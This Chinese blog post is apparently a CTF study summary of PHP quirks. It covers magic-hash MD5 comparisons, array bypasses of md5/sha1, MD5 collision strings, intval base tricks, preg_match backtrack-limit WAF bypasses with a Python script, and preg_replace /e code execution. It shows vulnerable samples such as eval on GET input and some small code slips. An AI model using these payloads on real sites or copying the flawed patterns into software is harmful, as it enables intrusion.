<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <title>
        PHP特性总结 |
        
        A.M.|P.M.
    </title>
    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
  </script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
<div class="page-container">

    

    <header class="page-header">
        <div class="header-progress"></div>
    </header>

    <main class="page-main">

        <div class="page-main-content">

            <div class="page-main-content-top">
                <header class="header-wrapper">

    <div class="header-content">
        <a class="logo-title" href="/">
            A.M.|P.M.
        </a>

        <ul class="menu-list">
            
                <li class="menu-item">
                    <a class=""
                       href="/"
                    >
                        HOME
                    </a>
                </li>
            
                <li class="menu-item">
                    <a class=""
                       href="/archives"
                    >
                        ARCHIVES
                    </a>
                </li>
            
                <li class="menu-item">
                    <a class=""
                       href="/categories"
                    >
                        CATEGORIES
                    </a>
                </li>
            
        </ul>

        <div class="menu-bar">
            <div class="menu-bar-middle"></div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


            </div>

            <div class="page-main-content-middle">

                <main class="main-content normal-code-theme">

                    
                        <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">PHP特性总结</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span>John_Frod</span>
                        <span class="level">Lv4</span>
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-calendar"></i> 2021-05-12 14:50:55
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>
            <ul>
                
                    <li>
                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>
            <ul>
                
                    <li>
                        <a href="/tags/PHP/">PHP</a>
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="PHP特性总结"><a href="#PHP特性总结" class="headerlink" title="PHP特性总结"></a>PHP特性总结</h1><br/>

<h2 id="Hash比较缺陷"><a href="#Hash比较缺陷" class="headerlink" title="Hash比较缺陷"></a>Hash比较缺陷</h2><p>PHP在处理哈希字符串时，通过<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0e</code>开头的哈希值都解释为<code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0e</code>开头的，那么<code>PHP</code>将会认为他们相同，都是<code>0</code></p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Flag:&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要我们输入的参数a和b要不相同，但是他们的MD5要相同，这明显就是利用Hash的比较缺陷</p>
<p>我们只需要找出两个数MD5加密之后是以<code>0e</code>开头即可，常用的有以下几种</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO &#x3D;&#x3D;&gt; 0e830400451993494058024219903391</span><br><span class="line">s878926199a &#x3D;&#x3D;&gt; 0e545993274517709034328855841020</span><br><span class="line">s155964671a &#x3D;&#x3D;&gt; 0e342768416822451524974117254469</span><br><span class="line">s214587387a &#x3D;&#x3D;&gt; 0e848240448830537924465865611904</span><br><span class="line">s214587387a &#x3D;&#x3D;&gt; 0e848240448830537924465865611904</span><br><span class="line">s878926199a &#x3D;&#x3D;&gt; 0e545993274517709034328855841020</span><br><span class="line">s1091221200a &#x3D;&#x3D;&gt; 0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="md5函数绕过"><a href="#md5函数绕过" class="headerlink" title="md5函数绕过"></a>md5函数绕过</h3><ul>
<li><code>md5()</code>函数获取不到数组的值，默认数组为0</li>
</ul>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;a can not equal b&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<ul>
<li><code>sha1()</code>函数无法处理数组类型，将报错并返回false</li>
</ul>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;a can not equal b&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<br/>

<h3 id="md5强类型绕过"><a href="#md5强类型绕过" class="headerlink" title="md5强类型绕过"></a>md5强类型绕过</h3><p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串，两组经过url编码后的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1</span><br><span class="line">a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<h2 id="intval函数绕过"><a href="#intval函数绕过" class="headerlink" title="intval函数绕过"></a>intval函数绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed <span class="variable">$value</span> , <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>value: 要转换成 integer 的数量值</p>
<p>base: 转化所使用的进制</p>
<ul>
<li>特性一</li>
</ul>
<p>成功时返回 <code>value</code> 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>
<ul>
<li><p>特性二</p>
<p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
</li>
</ul>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> === <span class="string">&quot;4476&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (intval(<span class="variable">$num</span>,<span class="number">0</span>) === <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用八进制和十六进制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num&#x3D;0x117c</span><br><span class="line">num&#x3D;010574</span><br></pre></td></tr></table></figure>
<p>除此之外，这个函数还可以使用小数点来进行操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num&#x3D;4476.56</span><br></pre></td></tr></table></figure>
<ul>
<li>特性三</li>
</ul>
<p>如果<code>$base</code>为<code>0</code>直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\0)结束转换，但前提是进行弱类型比较</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="string">&quot;4476&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (intval(<span class="variable">$num</span>,<span class="number">0</span>) == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num&#x3D;4476a</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="preg-match函数绕过"><a href="#preg-match函数绕过" class="headerlink" title="preg_match函数绕过"></a>preg_match函数绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> , <span class="keyword">array</span> &amp;<span class="variable">$matches</span> = <span class="literal">null</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> , <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ) : <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>pattern: 要搜索的模式，字符串类型。</p>
<p>subject: 输入字符串。</p>
<p>matches: 如果提供了参数<code>matches</code>，它将被填充为搜索结果。 <code>$matches[0]</code>将包含完整模式匹配到的文本， <code>$matches[1]</code> 将包含第一个捕获子组匹配到的文本，以此类推。</p>
<h3 id="m"><a href="#m" class="headerlink" title="/m"></a>/m</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>,<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>
<p><code>/m </code>多行匹配，但是当出现换行符 <code>%0a</code>的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。</p>
<h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><p>这里要理解正则匹配的过程</p>
<p>PHP正则利用的是NFA（非确定性有限自动机）。</p>
<p>遇到<code>.*</code>或者<code>.+</code>：直接匹配字符串末尾，然后一个个回溯，与之后的模式比较</p>
<p>遇到<code>.*?</code>或者<code>.+?</code>：非贪婪模式，在匹配到符合的字符串，停止，由下一个模式匹配，下一个模式不符合，回溯，再由<code>.*?</code>匹配，直到下一个模式符合</p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$f</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$f</span>, <span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过<code>var_dump(ini_get(‘pcre.backtrack_limit’));</code>的方式查看当前环境下的上限</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210507110144.png" alt="image-20210507105919328"></p>
<p>回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的<strong>便不再是0或1，而是false</strong>，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();//&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span></span><br><span class="line">&#125;</span><br><span class="line">reponse = requests.post(url, data=data)</span><br><span class="line">print(reponse.text)</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="preg-replace-e-模式下的代码执行"><a href="#preg-replace-e-模式下的代码执行" class="headerlink" title="preg_replace /e 模式下的代码执行"></a>preg_replace /e 模式下的代码执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span> , <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span> , <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span> , <span class="keyword">int</span> <span class="variable">$limit</span> = <span class="number">-1</span> , <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span> ) : <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p>
<blockquote>
<p> /e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p>
</blockquote>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了<code>strtolower(&quot;\\1&quot;)</code>，那么要如何执行代码呢</p>
<blockquote>
<p><strong>反向引用</strong></p>
<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项</p>
<p>当我们传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>即 <strong>GET</strong> 方式传入的参数名为<code> .*</code>，值为 <code>$&#123;phpinfo()&#125;</code> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">变成了语句： preg_replace(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;phpinfo()&#125;&#125;);</span><br><span class="line">相当于：<span class="keyword">eval</span>(<span class="string">&#x27;strtolower(&#123;$&#123;phpinfo()&#125;&#125;);&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>而由于<code>.</code>属于非法的参数名，在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效，因此可以换成<code>\S*</code>。</p>
<p>下面再说说我们为什么要匹配到 <code>&#123;$&#123;phpinfo()&#125;&#125;</code> 或者 <code>$&#123;phpinfo()&#125;</code> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a class="link"   target="_blank" rel="noopener" href="http://php.net/manual/zh/language.variables.variable.php" >PHP可变变量<i class="fas fa-external-link-alt"></i></a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <code>$&#123;phpinfo()&#125;</code> 中的 <code>phpinfo()</code> 会被当做变量先执行，执行后，即变成 <code>$&#123;1&#125;</code> (phpinfo()成功执行返回true)。</p>
<br/>

<h2 id="in-array宽松比较"><a href="#in-array宽松比较" class="headerlink" title="in_array宽松比较"></a>in_array宽松比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较。</p>
